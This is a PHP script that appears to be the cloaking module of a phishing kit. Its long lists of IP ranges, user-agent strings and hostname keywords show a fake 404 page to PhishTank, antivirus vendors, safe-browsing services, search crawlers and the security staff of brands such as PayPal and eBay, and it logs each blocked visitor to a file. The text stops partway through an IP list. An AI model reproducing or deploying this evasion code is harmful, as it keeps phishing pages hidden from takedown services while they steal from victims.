<?php

include'../../string.php';
include'../../admin/VixxxyZ/blocklist.php';
// include'admin/VixxxyZ/vixxyz1.php';
include'../../admin/VixxxyZ/vixxyz2.php';
include'../../admin/VixxxyZ/vixxyz3.php';
include'../../admin/VixxxyZ/vixxyz4.php';
include'../../admin/VixxxyZ/vixxyz5.php';
include'../../admin/settings.php';
if(isset($_SERVER['HTTP_REFERER'])) {
    if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
       $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
       $save=fopen("../../bots.txt","a+");
       fwrite($save,$content);
       fclose($save);
       header("HTTP/1.0 404 Not Found");exit();

   }
   }

   if(isset($_SERVER['HTTP_REFERER'])) {
    if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
       $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
       $save=fopen("../../bots.txt","a+");
       fwrite($save,$content);
       fclose($save);
       header("HTTP/1.0 404 Not Found");exit();

   }
   }

### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

if ($ip2long >= $range_start && $ip2long <= $range_end){
   $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
       $save=fopen("../../bots.txt","a+");
       fwrite($save,$content);
       fclose($save);
       header("HTTP/1.0 404 Not Found");exit();

}

$Bots = array("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot.","bot/","_bot",".bot","/bot","-bot",":bot","(bot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","siteexplorer","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xget","xift","xirq","yandex","yanga","yeti","yodao","zao/","zippp","zyborg","proximic","Googlebot","Baiduspider","Cliqzbot","A6-Indexer","AhrefsBot","Genieo","BomboraBot","CCBot","URLAppendBot","DomainAppender","msnbot-media","Antivirus","YoudaoBot","MJ12bot","linkdexbot","Go-http-client",	"Googlebot","Baiduspider","PhantomJS","applebot","metauri.com","Twitterbot","ia_archiver","R6_FeedFetcher","NetcraftSurveyAgent","Sogouwebspider","bingbot","Yahoo!Slurp","facebookexternalhit","PrintfulBot","msnbot","Twitterbot","UnwindFetchor","urlresolver","Butterfly","TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms","YandexBot","SearchmetricsBot","picsearch","TweetedTimesBot","QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIXCrawler","R6_CommentReader","magpie-crawler","GrapeshotCrawler","PercolateCrawler","MaxPointCrawler","R6_FeedFetcher","NetSeercrawler","grokkit-crawler","SMXCrawler","PulseCrawler","Y!J-BRW","80legs.com/webcrawler","Mediapartners-Google","Spinn3r","InAGist","Python-urllib","NING","TencentTraveler","Feedfetcher-Google","mon.itor.us","spbot","Feedly","bot","java","curl","spider","crawler");

   if(in_array($_SERVER['REMOTE_ADDR'],$Bots)) {
	      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	}

$Botname = array( // LIST BOOTS NAME
		"bot","above","google","softlayer","amazonaws","cyveillance","compatible","facebook","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","Trident","X11","Macintosh","crawler","urlredirectresolver","jetbrains","spam","windows95","windows98","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abravespider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xift","xirq","yandex","yanga","yeti","yahoo!");
	
	foreach ($Botname as $words) {
        if (stripos($_SERVER['HTTP_USER_AGENT'],$words)){
	     	 $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	    }
    }
	if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
                  
            $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	}

	if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

			  $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

    }


    $ipsed = $_SERVER['REMOTE_ADDR'];
    $IP_Banned = array(
       "^81.161.59.*","^66.135.200.*","^91.103.66.*","^208.91.115.*","^199.30.228.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^209.85.128.*","^216.239.32.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","54.228.218.117","^54.228.218.*","185.28.20.243","^185.28.20.*","217.16.26.166","^217.16.26.*","50.16.241.113","50.16.241.114","50.16.241.117","50.16.247.234","52.204.97.54","52.5.190.19","54.197.234.188","54.208.100.253","23.21.227.69","65.214.45.143","65.214.45.148","66.235.124.192","66.235.124.7","66.235.124.101","66.235.124.193","66.235.124.73","66.235.124.196","66.235.124.74","63.123.238.8","202.143.148.61","66.249.66.1","1.9.2.13","1.9.2.15","62.210.13.58","104.62.2.60","104.83.233.198","107.178.194.64","108.161.29.60","115.238.55.18","119.97.214.138","138.197.207.*","145.239.156.71","145.239.156.89","150.70.168.35","150.70.188.167","154.127.57.30","162.243.128.197","162.243.187.126","162.243.69.215","165.227.0.128","170.250.139.48","138.197.207.147","173.230.147.44","177.39.232.144","178.17.170.156","185.104.186.168","185.220.101.26","185.28.20.243","188.166.63.71","192.36.27.7","196.52.84.81","204.13.201.137","208.87.233.140","212.83.139.219","212.92.117.5","216.164.117.239","217.16.26.166","217.96.188.74","219.117.238.170","23.27.153.247","23.27.154.37","24.23.24.144","27.0.1453.110","3.0.04506.648","3.0.4506.2152","31.168.158.239","34.237.113.113","39.0.2150.5","41.0.2272.118","43.0.2357.81","44.0.2403.155","46.101.94.163","5.62.39.18","5.62.41.35","5.62.56.91","50.112.194.65","50.116.2.167","51.0.2704.103","52.18.11.161","52.192.164.225","52.27.2.86","52.31.63.97","52.5.98.73","52.72.33.140","52.87.10.90","52.91.94.56","53.0.2785.116","54.213.103.141","54.228.218.117","54.245.191.79","56.0.2924.87","57.0.2987.98","61.0.3116.0","62.24.252.133","62.67.194.35","63.0.3239.132","64.0.3282.140","64.0.3282.167","66.0.3358.0","66.0.3359.0","67.0.3360.0","67.0.3361.0","68.65.53.71","75.163.12.85","76.19.184.88","77.69.251.230","80.104.176.17","81.0.48.*","81.0.48.138","84.13.191.239","84.92.148.184","88.99.62.141","217.96.197.246","89.234.157.254","91.231.212.111","173.239.240.147","103.248.172.42","87.113.96.90","165.227.0.128","185.229.190.140", "165.227.0.128", "46.101.94.163", "165.227.39.194","87.113.96.90","46.101.119.24","82.102.27.75", "173.239.230.97", "82.102.27.75", "87.113.96.90", "46.101.119.24", "173.239.230.97", "87.113.96.90", "87.113.96.90", "159.203.0.156", "162.243.187.126","82.102.27.75", "87.113.96.90","103.248.172.42", "103.248.172.42", "47.30.133.89", "103.248.172.42");
    
    if(in_array($ipsed,$IP_Banned)){
        $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
          $save=fopen("../../bots.txt","a+");
          fwrite($save,$content);
          fclose($save);
        header("HTTP/1.0 404 Not Found");exit();
  
     }
    $lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $HOSTNAME = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler","googlebot","Googlebot-Video","bingbot","Baiduspider","Baiduspider-mobile","Baiduspider-video","Baiduspider-image","NaverBot","Yeti","Yandex","YandexBot","YandexMobileBot","YandexVideo","YandexWebmaster","YandexSitelinks","SeznamBot","AdsBot-Google","Twitterbot","Adidxbot","externalfacebookhit","Facebot","Yahoo Pipes 1.0","facebookexternalhit","EtaoSpider","amazon","netflix","Slurp","msnbot","Applebot","Googlebot-Image","teoma","ia_archiver","YandexDirect","gsa-crawler","OmniExplorer_Bot","msnbot-mobile","YahooSeeker","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");
  
       foreach($blocked_words as $word) {
         if (substr_count($HOSTNAME, $word) > 0) {
            $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bad word ] \r\n";
          $save=fopen("../../bots.txt","a+");
          fwrite($save,$content);
          fclose($save);
        header("HTTP/1.0 404 Not Found");exit();
  
        }
        }

        $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        $blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com");
        
            foreach($blocked_words as $word) {
                if (substr_count($hostname, $word) > 0) {
        
                   $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blocked ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
                }
            }
        
        $bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^84.93.84.*","^182.75.120.*","^182.75.120.10","^46.101.43.*","^147.75.210.*");
            if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
        
                     $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
        
            } else {
                 foreach($bannedIP as $ip) {
                      if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
        
                      }
                 }
            }
        
        
            $v_agent = $_SERVER['HTTP_USER_AGENT'];
        if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
        
               $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
        }
        if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
                $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                    $save=fopen("../../bots.txt","a+");
                    fwrite($save,$content);
                    fclose($save);
                    header("HTTP/1.0 404 Not Found");exit();
        
        }
        
        $id = $_SERVER['REMOTE_ADDR'];
        $ips = array(
        "^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.120.12.*", "^157.201.10.*", "^172.217.*.*", "^103.86.99.*", "^213.100.*.*", "^216.58.*.*", "^173.194.*.*", "^74.125.133.*","^66.102.*.*", "^66.249.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","^184.165.*.*","^198.68.61.*","^199.3.10.*","^204.119.24.*","^204.251.90.*","^100.43.*.*","^72.94.249.*","^103.6.76.*","^106.12.*.*","^115.231.36.*","^5.189.*.*","^66.102.6.*","^66.249.*.*","^173.252.*.*","^196.23.168.*","^190.82.81.*","^92.189.25.*","^52.31.147.*","^69.164.111.*","^173.252.86.*","^173.239.*.*","^203.215.181.*","^208.43.225.*","^173.192.*.*","^212.113.37.*","^119.63.*.*","^188.207.200.*","^89.108.102.*","^173.11.97.*","^209.185.108.*",
            "^209.185.253.*","^216.239.*.*","^64.68.*.*","^66.249.*.*","^72.14.199.*","^8.6.48.*","^141.185.209.*","^169.207.238.*","^202.160.*.*","^195.211.*.*","^185.41.162.*","^51.15.*.*","^84.51.153.*","^185.220.101.*","^40.85.158.*","^72.94.249.*","^8.23.224.*","^104.132.20.*","^1.33.126.*","^217.96.*.*","^64.233.160.*","^93.119.*.*","^23.27.152.*","^111.231.*.*","^144.217.82.*","^148.163.128.*","^41.208.72.*","^36.74.236.*","^64.233.173.*","^36.83.56.*","^87.115.213.*","^110.88.*.*","^46.101.119.*","^87.115.213.*","^68.14.83.*","^100.6.107.*","^174.255.*.*","^72.49.133.*","^104.15.60.*","^35.153.86.*","^191.98.136.*","^175.135.172.*","^134.119.*.*","^208.101.*.*","^104.42.*.*","^181.229.*.*","^89.234.*.*","^186.6.*.*","^103.19.16.*","^158.69.216.*","^157.39.109.*","^83.31.*.*","^92.23.56.*","^86.132.235.*","^106.133.165.*","^111.89.*.*","^14.101.178.*","^107.178.*.*","^180.29.89.*","^61.21.221.*","^204.85.191.*","^188.166.*.*","^103.19.16.*","^199.59.150.*","^209.135.212.*","^208.87.233.*","^83.31.*.*","^49.104.10.*","^216.252.*.*","^24.172.*.*","^193.128.*.*","^162.244.*.*","^40.121.198.*","^95.45.252.*","^188.166.*.*","^83.71.*.*","^66.214.*.*","^205.201.132.*","^40.107.*.*","^104.132.*.*","^173.205.33.*","^185.145.156.*","^17.198.249.*","^103.35.*.*","^128.28.*.*","^128.72.*.*","^128.75.*.*","^138.122.*.*","^139.59.*.*","^50.107.*.*","^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
         "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
         "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
        "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
         "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
         "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
